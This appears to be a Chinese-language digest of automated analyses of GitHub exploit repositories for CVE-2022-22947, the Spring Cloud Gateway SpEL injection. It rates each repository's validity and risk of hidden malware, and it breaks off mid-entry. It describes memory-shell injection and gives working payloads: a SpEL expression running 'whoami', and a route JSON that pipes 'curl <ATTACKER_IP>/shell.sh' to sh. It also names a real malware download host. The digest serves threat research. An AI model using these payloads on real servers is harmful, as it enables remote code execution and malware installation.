**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。根据漏洞信息和搜索结果，当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的 POC 代码使用 `AddResponseHeader` 过滤器，通过 SpEL 表达式调用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法来动态定义一个名为 `ms.GMemShell` 的类，该类是一个哥斯拉内存马。然后，将该类注入到目标 JVM 中，从而实现远程代码执行。根据漏洞描述和相关资料，此方法是有效的。PoC 通过发送恶意构造的请求到 Gateway Actuator 端点来触发漏洞。

**投毒风险：**
虽然主要目的是注入内存马，但代码中存在一定的潜在投毒风险。内存马本身就是一种恶意行为，因为它允许攻击者在不修改磁盘文件的情况下执行任意代码。该内存马具体实现未完整提供，但从github链接可以知道是一个哥斯拉内存马，因此假设其功能为接收 base64 编码的恶意代码并执行。风险点分析：

*   **内存马本身：** 注入内存马已经具有极高的风险。
*   **未清除路由：**  README提到代码没有清除路由部分，如果攻击者不清除路由，可能会留下后门，方便后续访问。
*   **默认密钥：** 哥斯拉内存马默认存在密钥，攻击者使用默认密钥能够轻易控制目标系统。

虽然POC的主要目的是为了验证漏洞，但是内存马本身具有极高的危害性，因此判定存在一定投毒风险。

**利用方式：**

1.  **前提条件：**  目标 Spring Cloud Gateway 实例的 Gateway Actuator 端点已启用、公开且未受保护。
2.  **发送恶意请求：**  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，并将其发送到 Gateway Actuator 端点。该表达式利用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法动态定义一个哥斯拉内存马类 `ms.GMemShell`，该类会将恶意代码注入到服务器的内存中。
3.  **内存马激活：** 内存马被注入后，攻击者可以使用哥斯拉客户端与注入的内存马进行交互，发送指令。
4.  **远程代码执行：** 攻击者可以通过哥斯拉客户端执行任意代码，从而控制目标服务器。

**项目地址:** [0730Nophone/CVE-2022-22947-](https://github.com/0730Nophone/CVE-2022-22947-)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #2

**来源**: [CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md](../2022/CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ 以及所有旧版本

**利用条件:** Gateway Actuator endpoint 必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator endpoint 启用、暴露且未进行安全保护时，允许未经身份验证的远程攻击者发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。根据搜索引擎结果和漏洞库信息，该漏洞已被公开利用，CISA KEV 中已收录。提供的代码片段是一个 Maven 项目的 `.iml` 文件，它描述了项目的依赖关系。虽然不能直接确定利用代码，但通过依赖信息（如 `spring-cloud-gateway-server:3.1.0`）可以推断该项目旨在构建一个易受攻击的 Spring Cloud Gateway 实例。利用方式通常涉及向 Actuator endpoint 发送包含恶意 SpEL 表达式的 HTTP 请求。投毒风险分析：提供的代码片段 `.iml` 文件本身不包含恶意代码，因为它只是描述了项目的依赖。 然而，整个代码仓库（如果存在其他文件）可能包含被作者隐藏的恶意代码。 这里将风险预估为10%，原因是不排除整个项目被投毒的可能性，例如构建脚本或隐藏的资源文件。

**项目地址:** [B0rn2d/Spring-Cloud-Gateway-Nacos](https://github.com/B0rn2d/Spring-Cloud-Gateway-Nacos)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #3

**来源**: [CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md](../2022/CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** 3.1.0, 3.0.0 至 3.0.6, 以及更早的不受支持版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未受保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点被启用、暴露且未受保护时，攻击者可以利用此漏洞发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**
提供的 POC 代码有效。它通过向 `/actuator/gateway/routes/{id}` 发送 POST 请求动态添加一个路由，该路由包含一个利用 SpEL 表达式执行命令的 filter。然后，通过 `POST /actuator/gateway/refresh` 刷新路由缓存来触发 SpEL 表达式的执行，从而实现远程代码执行。

**投毒风险：**
该漏洞利用代码仓库存在一定的投毒风险。具体分析如下：

1.  **依赖项版本：** POC 使用了 `spring-cloud-gateway-server` 和 `spring-cloud-starter-gateway` 的 3.0.6 版本，以及 `spring-boot-starter-actuator` 的 2.5.9 版本，这些版本组合是已知的漏洞版本，是复现漏洞的必要条件，不是投毒。
2.  **图片文件：** README.md 中引用了一些本地图片，这些图片可能包含恶意内容，但考虑到是本地图片，可能性较低。需要进一步分析确认。
3.  **漏洞利用方式：** POC 演示了如何利用 SpEL 表达式执行任意命令。攻击者可以修改 SpEL 表达式来执行恶意操作，例如安装后门程序、窃取敏感数据或进行拒绝服务攻击。
4.  **作者动机未知：** 在没有更多信息的情况下，无法确定作者的真实意图，不能排除作者故意引入恶意代码或配置的可能。

综合考虑，虽然 POC 本身是为了演示漏洞，但仓库中可能隐藏着其他恶意代码，因此存在一定的投毒风险。鉴于图片等本地资源可能存在风险，因此给出 10% 的投毒风险评估。

**利用方式：**

1.  **前提条件：** Spring Cloud Gateway 实例必须启用并暴露 Actuator 端点，且未进行安全保护。
2.  **添加路由：** 攻击者发送 POST 请求到 `/actuator/gateway/routes/{id}`，其中 `{id}` 是一个自定义的路由 ID。请求体包含一个 JSON 对象，该对象定义了路由的 predicates 和 filters。其中，filters 包含一个 AddResponseHeader filter，其 `value` 属性包含一个 SpEL 表达式，该表达式将执行任意命令。
3.  **刷新路由：** 攻击者发送 POST 请求到 `/actuator/gateway/refresh` 以刷新路由缓存。这将导致 Spring Cloud Gateway 重新加载路由配置，并解析和执行 SpEL 表达式。
4.  **代码执行：** SpEL 表达式执行任意代码，从而允许攻击者控制受影响的系统。

**项目地址:** [Enokiy/cve-2022-22947-spring-cloud-gateway](https://github.com/Enokiy/cve-2022-22947-spring-cloud-gateway)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #4

**来源**: [CVE-2022-22947-LY613313_CVE-2022-22947.md](../2022/CVE-2022-22947-LY613313_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator endpoint 启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入，执行任意代码。利用方式是发送包含恶意SpEL表达式的POST请求到/actuator/gateway/routes端点，然后刷新路由，触发SpEL表达式的执行，从而实现远程代码执行。

**有效性评估：**
根据漏洞信息和POC代码，此POC代码是有效的。漏洞库信息明确指出该漏洞允许远程代码执行，搜索引擎结果也确认了这一点，并且提供了公开的漏洞利用代码。

**投毒风险评估：**
代码本身看起来是标准的漏洞利用代码，用于利用 CVE-2022-22947 漏洞。其中一个潜在的风险点在于 `commond` 变量，该变量从用户输入获取，然后拼接到 SpEL 表达式中。如果用户输入恶意或过长的命令，可能会导致目标系统崩溃或执行意外操作。但是，这不属于作者投毒的范畴。`base64cmd` 函数将用户输入的命令进行 Base64 编码，这本身并非恶意行为，但如果用户输入的命令本身就具有破坏性，Base64 编码只是对其进行了编码，并没有改变其本质。总体来看，该 POC 代码的投毒风险较低，约为 10%。主要的风险在于用户输入，而非代码本身。

**漏洞利用方式：**
1.  **条件判断：** 确定目标系统运行着受影响的 Spring Cloud Gateway 版本，并且 Gateway Actuator endpoint 处于启用、暴露且未进行安全保护的状态。
2.  **构造恶意请求：** 使用POST请求，构造包含恶意SpEL表达式的JSON数据，发送到`/actuator/gateway/routes`端点。SpEL表达式中包含要执行的系统命令。
3.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，刷新Gateway的路由配置，触发SpEL表达式的执行。
4.  **执行任意代码：** 恶意SpEL表达式被执行，从而在目标系统上执行任意代码，例如反弹shell。
5.  **清理：** 删除添加的路由，再次刷新路由。


**项目地址:** [LY613313/CVE-2022-22947](https://github.com/LY613313/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #5

**来源**: [CVE-2022-22947-Le1a_CVE-2022-22947.md](../2022/CVE-2022-22947-Le1a_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** 需要Gateway Actuator端点启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator端点被启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入执行任意代码。  

**有效性：**
提供的PoC代码有效。代码通过构造包含恶意SpEL表达式的路由配置，利用`/actuator/gateway/routes`端点添加恶意路由，然后通过`/actuator/gateway/refresh`端点刷新路由，触发SpEL表达式执行，从而实现远程代码执行。PoC代码在执行命令后，还会删除创建的恶意路由，并再次刷新路由，以清除痕迹。

**投毒风险：**
该仓库中的PoC代码没有发现明显的投毒代码。PoC代码的功能明确，即利用漏洞执行命令并返回结果。代码主要通过`requests`库发送HTTP请求，并使用`re`库解析命令执行结果。没有任何迹象表明作者在代码中隐藏了恶意逻辑或后门。

**利用方式：**
1.  **目标确认：**  确认目标系统正在运行存在漏洞的Spring Cloud Gateway版本，并且Actuator端点已启用、暴露且未授权访问。
2.  **构造恶意请求：**  攻击者构造一个包含恶意SpEL表达式的JSON payload，发送到`/actuator/gateway/routes/{id}`端点，其中SpEL表达式用于执行任意命令。例如，`#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()))}`
3.  **刷新路由：**  发送一个POST请求到`/actuator/gateway/refresh`端点，强制Gateway刷新路由配置，从而触发SpEL表达式执行。
4.  **获取执行结果：**  发送一个GET请求到`/actuator/gateway/routes/{id}`，获取包含执行结果的响应头。
5.  **清理：** 删除添加的恶意路由，并再次刷新路由。

**项目地址:** [Le1a/CVE-2022-22947](https://github.com/Le1a/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #6

**来源**: [CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md](../2022/CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md)

## CVE-2022-22947 Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意远程代码。该漏洞的利用方式如下：

1.  **漏洞原理：** 漏洞根源在于 SpEL 表达式的错误处理，攻击者可以通过 SpEL 表达式注入恶意代码。
2.  **利用步骤：**
    *   攻击者首先发送包含恶意 SpEL 表达式的请求到 `/actuator/gateway/routes/` 端点，添加一个新的路由，其中 `filter` 使用 `AddResponseHeader` 过滤器，`value` 包含恶意的 SpEL 表达式，SpEL表达式会被base64编码，保证其可以正常传输
    *   然后，攻击者通过访问 `/actuator/gateway/refresh` 端点，强制网关刷新路由配置，从而触发 SpEL 表达式的执行。
    *   最后，攻击者可以通过访问之前创建的路由(`/actuator/gateway/routes/66Sec`)，触发 SpEL 表达式的执行，并将执行结果通过请求返回。
3.  **POC 代码分析：**
    *   `CVE-2022-22947.py` 脚本首先定义了几个关键变量，包括 URL 路径（`payload1`, `payload2`, `payload3`）和请求头（`headers`）。
    *   `data` 变量包含经过 Base64 编码的恶意路由配置信息。该配置信息设置了一个名为 `WeianSec` 的路由，该路由使用 `AddResponseHeader` 过滤器，并将 SpEL 表达式注入到 `value` 属性中。
    *   脚本使用 `requests` 库发送 POST 请求到 `/actuator/gateway/routes/66Sec` 端点，添加恶意路由。
    *   然后，脚本发送 POST 请求到 `/actuator/gateway/refresh` 端点，刷新路由配置。
    *   最后，脚本发送 GET 请求到 `/actuator/gateway/routes/66Sec` 端点，提取执行结果。
    *   脚本中的 cmd变量，允许用户自定义执行的命令，增加了灵活性。
4.  **有效性：** 根据漏洞库信息、搜索结果和提供的 POC 代码，该 POC 代码是有效的，可以实现远程代码执行。
5.  **投毒风险：** 仓库中存在小概率的投毒风险（10%）。风险点在于，虽然主脚本 `CVE-2022-22947.py` 看似直接利用漏洞，但攻击者可以通过修改 `cmd` 变量来执行任意命令，并且README.md文件中提供的图片是经过处理的，不排除作者后期修改代码，添加恶意后门的可能。

**项目地址:** [SecNN/CVE-2022-22947_Rce_Exp](https://github.com/SecNN/CVE-2022-22947_Rce_Exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #7

**来源**: [CVE-2022-22947-SiJiDo_CVE-2022-22947.md](../2022/CVE-2022-22947-SiJiDo_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), and unsupported versions

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。攻击者可以在 Gateway Actuator 端点开启且未进行安全保护的情况下，通过构造恶意请求执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** 该漏洞源于 Spring Cloud Gateway 中 SpEL 表达式的执行，攻击者可以通过 SpEL 表达式注入恶意代码，进而执行任意命令。
2.  **利用条件：**
    *   目标系统使用存在漏洞的 Spring Cloud Gateway 版本。
    *   Gateway Actuator 端点被启用。
    *   Gateway Actuator 端点对外暴露且未进行任何身份验证。
3.  **漏洞利用代码分析：** 提供的Python脚本 (exp.py)首先定义了一个`GMem`类，将编译后的java字节码进行base64解码后赋值给`classbytes`。该Java类主要功能：
    *   通过反射机制定义类 (`ReflectUtils.defineClass`)
    *   执行命令
    *   进行base64编码/解码等操作。
    *   创建了一个包含payload的HashMap，payload被精心构造用于在目标服务器上执行命令。
    脚本通过修改`RequestMappingInfo`的`Builder`并调用`build()`方法触发漏洞，最终导致RCE。
4.  **有效性评估：** 根据漏洞信息和利用代码，该漏洞利用的有效性较高。CISA 将其添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。
5.  **投毒风险评估：** 代码存在一定的投毒风险。虽然脚本主要功能是利用漏洞，但其中嵌入的Java类和SpEL表达式可能包含其他未知的恶意行为。该脚本通过Base64编码隐藏了部分代码，增加了分析难度。该脚本存在投毒风险的可能性为10%, 主要是由于代码混淆和潜在的Java恶意行为。
6.  **利用方式总结：**
    *   攻击者发送恶意构造的 HTTP 请求到 Gateway Actuator 端点。
    *   请求中包含 SpEL 表达式，用于执行任意代码。
    *   Spring Cloud Gateway 在处理请求时，由于没有对 SpEL 表达式进行充分的验证和过滤，导致代码注入。
    *   攻击者通过代码注入执行恶意命令，例如反弹 shell 或执行其他恶意操作。

综上所述，CVE-2022-22947 是一个严重的安全漏洞，攻击者可以利用它在目标系统上执行任意代码，因此需要及时修复。

**项目地址:** [SiJiDo/CVE-2022-22947](https://github.com/SiJiDo/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #8

**来源**: [CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md](../2022/CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator 端点已启用、公开且未受保护。

**POC 可用性:** 是

**投毒风险:** 85%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意的 SpEL 表达式来执行任意代码。 

**有效性：**
根据漏洞信息、搜索结果和提供的 POC 代码，该漏洞利用是有效的。POC 通过向 `/actuator/gateway/routes` 端点发送 POST 请求来创建新的路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。然后刷新路由，并通过访问新创建的路由触发代码执行。最后删除该路由。

**投毒风险：**
提供的 POC 代码存在较高的投毒风险。具体体现在：
1.  **恶意脚本下载和执行：** POC 代码中的 SpEL 表达式尝试从远程服务器（如 `94.103.87.71/scg.sh` ）下载并执行 shell 脚本。 这允许攻击者注入任意恶意代码，例如下载和安装 Kinsing 恶意软件。
2.  **后门植入：** 下载的 shell 脚本可能包含后门代码，允许攻击者在受害者系统上保持持久访问。
3. ** Kinsing恶意软件:** 通过分析shell脚本，发现最终目的是下载并安装 Kinsing 恶意软件

因此，此存储库的投毒风险非常高，约为 85%。使用此POC需要谨慎，务必在隔离环境中进行分析，确保不会对本地环境造成风险。

**利用方式：**
1.  **检查 Actuator 端点：** 确认目标 Spring Cloud Gateway 实例的 Actuator 端点是否启用、公开且未受保护。
2.  **创建恶意路由：** 使用 POST 请求向 `/actuator/gateway/routes` 端点创建一个新的路由。在路由的 `filters` 部分，使用 `AddResponseHeader` 过滤器，并在 `value` 字段中插入包含恶意 SpEL 表达式的代码。 例如:

   ```json
   {
	 "id": "poc",
	 "filters": [{
	   "name": "AddResponseHeader",
	   "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"curl -s <ATTACKER_IP>/shell.sh|sh\"}).getInputStream()))}"}
	   }],
	 "uri": "http://example.com",
	 "order": 0
	}
   ```

3.  **刷新路由：** 使用 POST 请求向 `/actuator/gateway/refresh` 端点发送请求，以刷新所有路由。
4.  **触发代码执行：** 访问新创建的路由，触发 SpEL 表达式的执行。
5.  **清理：** 使用 DELETE 请求向 `/actuator/gateway/routes/{route_id}` 端点删除创建的恶意路由。

**项目地址:** [Sumitpathania03/CVE-2022-22947](https://github.com/Sumitpathania03/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #9

**来源**: [CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md](../2022/CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的代码注入漏洞。根据漏洞描述，当 Gateway Actuator 端点启用、公开且未受到保护时，应用程序容易受到代码注入攻击。攻击者可以发送恶意构造的请求，从而允许在远程主机上执行任意远程代码。

**有效性：**
提供的 POC 代码 `CVE-2022-22947-memshell.py` 看起来是有效的。它利用了 SpEL 表达式注入漏洞，通过构造包含恶意 SpEL 表达式的请求，在目标系统上动态定义一个名为 `SpringRequestMappingMemshell` 的类，实现内存马注入。代码首先对恶意类进行base64编码, 然后通过SpEL表达式解码并加载到JVM中,达到了远程代码执行的效果。

**投毒风险：**
评估 POC 代码是否存在投毒风险。代码的主要功能是利用漏洞注入内存马，实现远程代码执行。其中注入的`SpringRequestMappingMemshell`类需要进一步分析。

通过检查代码，发现注入的类功能是注册一个requestMapping，执行的command命令可以从request参数中获取，具有命令执行功能，但它本身是漏洞利用的一部分，不能算作是作者隐藏的投毒代码。

但考虑到任何远程代码执行漏洞都可能被滥用，因此使用此POC的风险仍然较高。考虑到风险的存在，但不是代码编写者有意为之的恶意添加，评估投毒风险为5%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例的 Actuator 端点必须启用、公开且未受保护。
2.  **漏洞利用：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP 请求，该表达式会被 Gateway Actuator 处理。
3.  **代码注入：** 恶意 SpEL 表达式用于在服务器的内存中定义一个新的 Java 类 (内存马)。
4.  **远程代码执行：** 注入的 Java 类执行攻击者指定的任意代码。

总而言之，此漏洞的利用方式是通过SpEL表达式注入，动态注册一个新的路由，并将处理逻辑绑定到恶意构造的Java类，该类可以接受参数并在服务器上执行任意命令。此过程允许攻击者在目标系统上实现未经授权的远程代码执行。

**项目地址:** [Wrong-pixel/CVE-2022-22947-exp](https://github.com/Wrong-pixel/CVE-2022-22947-exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #10

**来源**: [CVE-2022-22947-Zh0um1_CVE-2022-22947.md](../2022/CVE-2022-22947-Zh0um1_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1+, 3.0.x < 3.0.7+

**利用条件:** Gateway Actuator endpoint 启用、暴露且未做安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Actuator 端点启用且未授权时，攻击者可以通过构造恶意的 SpEL 表达式，利用`Path`路由断言中的 SpEL 注入漏洞执行任意代码。提供的 POC 代码旨在通过动态定义Java类的方式注入哥斯拉内存马。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被证实存在，且有在野利用。提供的 POC 代码实现了利用该漏洞注入哥斯拉内存马，因此该 POC 有效。

**投毒风险分析：**
分析给出的POC代码，主要功能是利用漏洞注入哥斯拉内存马，实现远程代码执行。虽然POC本身是为了利用漏洞，但如果用户直接使用此POC而不了解其行为，可能会被利用来植入恶意后门。

*   代码主要功能：该代码使用Go语言编写，利用 Spring Cloud Gateway 的 SpEL 表达式注入漏洞。它构造一个包含恶意 SpEL 表达式的请求，该表达式用于在目标服务器上动态定义一个 Java 类（哥斯拉内存马），从而实现远程代码执行。
*   投毒可能性：
    *   **高：** 代码直接注入内存马，如果目标系统部署了恶意程序，攻击者也可以构造其他的恶意代码注入到内存中，比如替换关键组件、窃取数据等。
    *   **低：** 由于代码的目的是利用漏洞注入内存马，从这个角度看，本身就是一种攻击行为，很难区分是“正常”利用还是“投毒”。因此，认为该仓库存在一定投毒风险，风险等级较低。

基于以上分析，判定投毒风险为10%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，且未进行安全保护（例如，未进行身份验证）。
2.  **构造恶意请求：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP POST 请求，该表达式利用 `T(org.springframework.cglib.core.ReflectUtils).defineClass` 动态定义一个 Java 类（通常是一个 Webshell 或内存马）。
3.  **利用 Path 路由断言：**  该恶意 SpEL 表达式被嵌入到 Spring Cloud Gateway 的 `Path` 路由断言的参数中。
4.  **发送请求：** 将构造的恶意请求发送到 `/actuator/gateway/routes` 端点。
5.  **代码执行：** Spring Cloud Gateway 在处理路由断言时，会解析并执行 SpEL 表达式，从而在目标服务器上执行攻击者注入的恶意代码。
6.  **内存马驻留：** 注入的哥斯拉内存马会驻留在服务器内存中，允许攻击者通过特定的 HTTP 请求与服务器交互，执行任意命令或上传文件。

**项目地址:** [Zh0um1/CVE-2022-22947](https://github.com/Zh0um1/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #11

**来源**: [CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md](../2022/CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md)

## CVE-2022-22947-Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator endpoint is enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是一个存在于Spring Cloud Gateway中的代码注入漏洞。当Gateway Actuator端点被启用、暴露且未进行安全保护时，远程攻击者可以通过构造恶意请求执行任意代码。漏洞根源在于getValue方法中不安全的SpEL表达式求值。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，且已经有公开的POC。漏洞利用代码是一个Maven项目，旨在重现漏洞。因此，提供的POC代码很可能是有效的。

**投毒风险：**
提供的代码仓库包含一个`README.md`文件和一个`mvnw`脚本。`mvnw` 是 Maven Wrapper 脚本，用于在没有安装 Maven 的情况下构建项目。检查 `mvnw` 脚本，它主要负责下载和启动 Maven，没有发现明显的恶意行为。但是，仍然存在一定的投毒风险，例如：
1.  **依赖项投毒：** 构建项目时使用的 Maven 依赖项可能包含恶意代码。 这种情况发生的概率较低，但存在可能。
2.  **构建脚本投毒：** `pom.xml`文件(未提供)中可能存在恶意插件或目标，在构建过程中执行恶意代码。由于未提供此文件，无法对此进行评估。

考虑到提供的文件主要与Maven构建相关，直接植入后门的难度较高，但通过依赖项投毒的可能性是存在的。因此，投毒风险估计为10%。

**利用方式：**
1.  **确定目标：** 找到运行着存在漏洞的Spring Cloud Gateway实例，并且其Actuator端点对外开放且未进行认证。
2.  **构造恶意请求：** 构造包含恶意SpEL表达式的HTTP请求，发送到Actuator端点。这些SpEL表达式能够执行任意系统命令或代码。
3.  **远程代码执行：**  Spring Cloud Gateway解析并执行恶意SpEL表达式，从而导致远程代码执行。
4.  **控制系统：** 攻击者利用执行的恶意代码控制受害系统。

**优先级：**
根据信息来源的重要性排序：搜索引擎结果 > 漏洞利用代码 > 漏洞库信息

**项目地址:** [aesm1p/CVE-2022-22947-POC-Reproduce](https://github.com/aesm1p/CVE-2022-22947-POC-Reproduce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #12

**来源**: [CVE-2022-22947-anansec_CVE-2022-22947_EXP.md](../2022/CVE-2022-22947-anansec_CVE-2022-22947_EXP.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、公开且未进行安全保护时，攻击者可以通过构造恶意请求，在远程主机上执行任意代码。根据提供的漏洞利用代码，该PoC利用了SpEL表达式注入，通过向`/actuator/gateway/routes/check01`端点发送包含恶意SpEL表达式的POST请求，然后刷新路由并访问该路由，触发SpEL表达式执行。EXP具有单个目标验证、批量验证、反弹shell的功能。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，可以判断该漏洞的PoC代码是有效的。搜索结果中多个链接都表明该漏洞被广泛关注，且存在公开的利用代码。

**投毒风险：**
